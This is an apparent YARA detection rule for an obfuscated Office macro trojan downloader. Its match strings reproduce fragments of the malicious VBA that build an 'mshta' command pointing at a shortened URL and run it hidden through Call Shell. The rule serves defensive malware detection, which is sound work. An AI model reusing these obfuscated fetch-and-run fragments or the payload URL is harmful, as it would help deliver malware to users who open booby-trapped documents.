
rule TrojanDownloader_O97M_Obfuse_PXZS_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PXZS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {74 61 6c 69 79 61 20 3d 20 22 6d 73 68 74 70 6c 65 20 74 68 65 72 65 20 69 73 20 6d 61 6e 79 20 74 68 69 6e 67 20 69 6e 20 74 68 69 73 20 6c 69 66 65 2c 20 50 65 6f 70 6c 65 20 74 68 69 6e 67 20 77 65 20 61 72 65 20 6e 6f 74 20 6e 6f 72 6d 61 6c 22 } //1 taliya = "mshtple there is many thing in this life, People thing we are not normal"
		$a_01_1 = {4d 65 74 6f 6f 20 3d 20 53 74 72 69 6e 67 28 31 2c 20 22 61 22 29 } //1 Metoo = String(1, "a")
		$a_01_2 = {4d 6f 6e 65 79 20 3d 20 4c 65 66 74 28 74 61 6c 69 79 61 2c 20 34 29 20 2b 20 53 74 72 69 6e 67 28 31 2c 20 22 61 22 29 20 2b 20 41 6c 69 65 6e 77 61 72 65 20 2b 20 52 65 70 6c 61 63 65 28 22 4c 6f 76 65 6f 66 6d 79 6c 69 75 66 65 22 2c 20 22 4c 6f 76 65 6f 66 6d 79 6c 69 75 66 65 22 2c 20 22 68 74 74 70 3a 5c 5c 62 22 29 20 26 20 22 69 74 2e 6c 79 2f 71 6c 6f 74 75 6c 70 76 62 74 6c 77 34 36 62 35 6a 78 32 32 22 } //1 Money = Left(taliya, 4) + String(1, "a") + Alienware + Replace("Loveofmyliufe", "Loveofmyliufe", "http:\\b") & "it.ly/qlotulpvbtlw46b5jx22"
		$a_01_3 = {43 61 6c 6c 20 53 68 65 6c 6c 28 4d 6f 6e 65 79 20 26 20 73 43 6f 6d 6d 61 6e 64 54 6f 52 75 6e 2c 20 76 62 48 69 64 65 29 } //1 Call Shell(Money & sCommandToRun, vbHide)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}